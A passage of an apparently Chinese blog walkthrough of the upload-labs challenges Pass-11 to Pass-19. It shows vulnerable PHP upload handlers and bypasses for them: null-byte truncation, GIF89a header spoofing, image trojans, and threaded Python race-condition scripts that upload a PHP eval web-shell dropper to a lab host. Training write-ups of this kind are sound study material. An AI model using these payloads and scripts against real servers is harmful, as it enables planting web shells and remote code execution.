Pass-11</h3><p>分析代码发现最终返回的图片链接是“存储路径名+重命名后的文件名”，看到这个我们就可以联想到使用%00截断路径。<br>我们首先修改参数为<code>index.php?save_path=../upload/test.php%00</code><br>；其次修改我们的<code>test.php</code>为<code>test.jpg</code>然后上传即可。<br>注: 此处应具有新建文件夹的权限，如果没有会报错并导致上传失败<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</div><div class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</div><div class="line">    <span class="comment">//substr()是返回从start参数开始的字符串的一部分</span></div><div class="line">    <span class="comment">//strrpos()是查找字符串在另一字符串中最后一次出现的位置</span></div><div class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</div><div class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</div><div class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</div><div class="line">            $is_upload = <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $msg = <span class="string">'上传失败！'</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="0x12-Pass-12"><a href="#0x12-Pass-12" class="headerlink" title="0x12 Pass-12"></a>0x12 Pass-12</h3><p>此题diff了一下，发现代码与Pass-11中的是一摸一样的，想换换花样的话在此处我们可以使用0x00截断。</p><p>%00和0x00截断的原理都是一样的，即系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束。</p><h3 id="0x13-Pass-13"><a href="#0x13-Pass-13" class="headerlink" title="0x13 Pass-13"></a>0x13 Pass-13</h3><p>分析下代码，发现此处就是对文件头进行了解析，此时只需要上传图片马或者在test.php文件的开头加上GIF89a即可。</p><p>多扯一句，图片马的制作就是将你的一句话木马追加到一张图片类型文件的后面。</p><p>此题的目的是上传，并不是getshell，所以到此就结束了，要想getshell还得配合文件解析漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</div><div class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</div><div class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></div><div class="line">    fclose($file);</div><div class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </div><div class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </div><div class="line">    $fileType = <span class="string">''</span>;    </div><div class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </div><div class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </div><div class="line">            $fileType = <span class="string">'jpg'</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </div><div class="line">            $fileType = <span class="string">'png'</span>;</div><div class="line">            <span class="keyword">break</span>;        </div><div class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </div><div class="line">            $fileType = <span class="string">'gif'</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">default</span>:            </div><div class="line">            $fileType = <span class="string">'unknown'</span>;</div><div class="line">        &#125;    </div><div class="line">        <span class="keyword">return</span> $fileType;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $file_type = getReailFileType($temp_file);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</div><div class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</div><div class="line">            $is_upload = <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $msg = <span class="string">"上传失败"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%8810.56.46.png" alt="image"></p><h3 id="0x14-Pass-14"><a href="#0x14-Pass-14" class="headerlink" title="0x14 Pass-14"></a>0x14 Pass-14</h3><p>分析一下代码，虽然写的不一样了，但是跟上一题差不多。所以同理可得</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</div><div class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</div><div class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</div><div class="line">        <span class="comment">//getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息</span></div><div class="line">        $info = getimagesize($filename);</div><div class="line">        <span class="comment">//image_type_to_extension()根据给定的常量 IMAGETYPE_XXX 返回后缀名</span></div><div class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</div><div class="line">        <span class="keyword">if</span>(stripos($types,$ext))&#123;</div><div class="line">            <span class="keyword">return</span> $ext;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $res = isImage($temp_file);</div><div class="line">    <span class="keyword">if</span>(!$res)&#123;</div><div class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</div><div class="line">            $is_upload = <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $msg = <span class="string">"上传失败"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%8811.14.44.png" alt="image"></p><h3 id="0x15-Pass-15"><a href="#0x15-Pass-15" class="headerlink" title="0x15 Pass-15"></a>0x15 Pass-15</h3><p>分析一下代码，关键在于<code>exif_imagetype()</code>函数，这个函数的意思是读取一个图像的第一个字节并检查其签名。注意此处只检测图像的第一个字节。所以在此处我们在上一题使用的方法依旧可以生效</p><p>Like</p><p>JPG<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FF D8 FF E0 00 10 4A 46 49 46</div></pre></td></tr></table></figure></p><p>GIF<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">47 49 46 38 39 61</div></pre></td></tr></table></figure></p><p>(相当于文本的GIF89a)</p><p>PNG<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">89 50 4E 47</div></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</div><div class="line">    <span class="comment">//需要开启php_exif模块</span></div><div class="line">    $image_type = exif_imagetype($filename);</div><div class="line">    <span class="keyword">switch</span> ($image_type) &#123;</div><div class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</div><div class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</div><div class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</div><div class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</div><div class="line">            <span class="keyword">break</span>;    </div><div class="line">        <span class="keyword">default</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $res = isImage($temp_file);</div><div class="line">    <span class="keyword">if</span>(!$res)&#123;</div><div class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</div><div class="line">            $is_upload = <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $msg = <span class="string">"上传失败"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="0x16-Pass-16"><a href="#0x16-Pass-16" class="headerlink" title="0x16 Pass-16"></a>0x16 Pass-16</h3><p>分析代码发现此处对图片进行了二次渲染比对，这里的原理是对比两张经过php-gd库转换过的gif图片，如果其中存在相同之处，这就证明这部分图片数据不会经过转换。然后我可以注入代码到这部分图片文件中，最终实现远程代码执行。</p><p>此处给一个已经构造的好的包含<code>&lt;?phpinfo();?&gt;</code>的图片，<a href="https://pan.baidu.com/s/1xzHZYPHsgsI0V5CNZsGpLQ" target="_blank" rel="external">PoC</a>  密码:o34g</p><h3 id="0x17-Pass-17"><a href="#0x17-Pass-17" class="headerlink" title="0x17 Pass-17"></a>0x17 Pass-17</h3><p>分析下代码发现多了<code>unlink()</code>函数，这个函数的作用是删除指定文件，看到这个基本就可以确定这是一个条件竞争写shell了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</div><div class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</div><div class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</div><div class="line">    $upload_file = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</div><div class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</div><div class="line">             $img_path = $UPLOAD_ADDR . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</div><div class="line">             rename($upload_file, $img_path);</div><div class="line">             $is_upload = <span class="keyword">true</span>;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</div><div class="line">            unlink($upload_file);</div><div class="line">        &#125;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $msg = <span class="string">'上传失败！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>我们首先先上传一个php脚本，内容如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php fputs(fopen(&quot;./info.php&quot;, &quot;w&quot;), &apos;&lt;?php @eval($_POST[&quot;drops&quot;]) ?&gt;&apos;); ?&gt;</div></pre></td></tr></table></figure><p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> hackhttp</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RaceCondition</span><span class="params">(threading.Thread)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        threading.Thread.__init__(self)</div><div class="line">        self.url = <span class="string">"http://172.16.5.129/upload/shell.php"</span></div><div class="line">        self.uploadUrl = <span class="string">"http://172.16.5.129/Pass-17/index.php"</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get</span><span class="params">(self)</span>:</span></div><div class="line">        print(<span class="string">'try to call uploaded file...'</span>)</div><div class="line">        r = requests.get(self.url)</div><div class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</div><div class="line">            print(<span class="string">"[*]create file info.php success"</span>)</div><div class="line">            <span class="comment">#os._exit(0)</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_upload</span><span class="params">(self)</span>:</span></div><div class="line">        print(<span class="string">"upload file....."</span>)</div><div class="line">        hh = hackhttp.hackhttp()</div><div class="line">        raw = <span class="string">"""</span></div><div class="line">        POST /Pass-17/index.php?action=show_code HTTP/1.1</div><div class="line">Host: 172.16.5.129</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://172.16.5.129/Pass-17/index.php?action=show_code</div><div class="line">Content-Type: multipart/form-data; boundary=---------------------------7566250541346608691122113904</div><div class="line">Content-Length: 413</div><div class="line">Cookie: PHPSESSID=95m62gnmge1fp26tg9c8hjj870</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line"></div><div class="line">-----------------------------7566250541346608691122113904</div><div class="line">Content-Disposition: form-data; name="upload_file"; filename="shell.php"</div><div class="line">Content-Type: text/php</div><div class="line"></div><div class="line">&lt;?php fputs(fopen("./info.php", "w"), '&lt;?php @eval($_POST["drops"]) ?&gt;'); ?&gt;</div><div class="line">-----------------------------7566250541346608691122113904</div><div class="line">Content-Disposition: form-data; name="submit"</div><div class="line"></div><div class="line">上传</div><div class="line">-----------------------------7566250541346608691122113904--</div><div class="line">        """</div><div class="line">        code, head, html, redirect, log = hh.http(<span class="string">'http://172.16.5.129/Pass-17/index.php'</span>, raw=raw)</div><div class="line">        print(str(code) + <span class="string">"\r"</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">                self._get()</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">                self._upload()</div><div class="line">                self._get()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    threads = <span class="number">20</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</div><div class="line">        t = RaceCondition()</div><div class="line">        t.start()</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</div><div class="line">        t.join()</div></pre></td></tr></table></figure><p>执行之后我们边可以发现在网站uploads目录下出现了我们想要的info.php<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-18%20%E4%B8%8B%E5%8D%882.10.05.png" alt="image"></p><h3 id="0x18-Pass-18"><a href="#0x18-Pass-18" class="headerlink" title="0x18 Pass-18"></a>0x18 Pass-18</h3><p>分析下题目，发现这个过滤只能上传指定文件，又看了apache版本，应该是有个解析漏洞。但是普通上传一个文件会被重命名，重命名后我们就找不到我们上传的shell了，所以我们在这里要让文件上传且不重命名，那么只能通过条件竞争来解决了，修改一下上题的脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> hackhttp</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RaceCondition</span><span class="params">(threading.Thread)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        threading.Thread.__init__(self)</div><div class="line">        self.uploadUrl = <span class="string">"http://172.16.5.129/Pass-18/index.php"</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_upload</span><span class="params">(self)</span>:</span></div><div class="line">        print(<span class="string">"upload file....."</span>)</div><div class="line">        hh = hackhttp.hackhttp()</div><div class="line">        raw = <span class="string">"""</span></div><div class="line">POST /Pass-18/index.php HTTP/1.1</div><div class="line">Host: 172.16.5.129</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://172.16.5.129/Pass-18/index.php?action=show_code</div><div class="line">Content-Type: multipart/form-data; boundary=---------------------------385016806609230031127102121</div><div class="line">Content-Length: 352</div><div class="line">Cookie: PHPSESSID=95m62gnmge1fp26tg9c8hjj870</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line"></div><div class="line">-----------------------------385016806609230031127102121</div><div class="line">Content-Disposition: form-data; name="upload_file"; filename="test.php.7Z"</div><div class="line">Content-Type: text/php</div><div class="line"></div><div class="line">&lt;?php phpinfo();?&gt;</div><div class="line">-----------------------------385016806609230031127102121</div><div class="line">Content-Disposition: form-data; name="submit"</div><div class="line"></div><div class="line">上传</div><div class="line">-----------------------------385016806609230031127102121--</div><div class="line">        """</div><div class="line">        code, head, html, redirect, log = hh.http(self.uploadUrl, raw=raw)</div><div class="line">        print(str(code) + <span class="string">"\r"</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">                self._upload()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    threads = <span class="number">20</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</div><div class="line">        t = RaceCondition()</div><div class="line">        t.start()</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</div><div class="line">        t.join()</div></pre></td></tr></table></figure><p>可以看到只要我们足够快，我们的未重命名的文件就可以存在，哈哈<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-18%20%E4%B8%8B%E5%8D%882.35.54.png" alt="image"></p><h3 id="0x19-Pass-19"><a href="#0x19-Pass-19" class="headerlink" title="0x19 Pass-19"></a>0x19 Pass-19</h3><p>分析了一下代码，发现过滤的还是挺严的，但是重命名这里还是有文章可以做的，使用00截断的方式就好了。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">$is_upload = <span class="keyword">false</span>;</div><div class="line">$msg = <span class="keyword">null</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</div><div class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</div><div class="line"></div><div class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</div><div class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</div><div class="line">            $img_path = 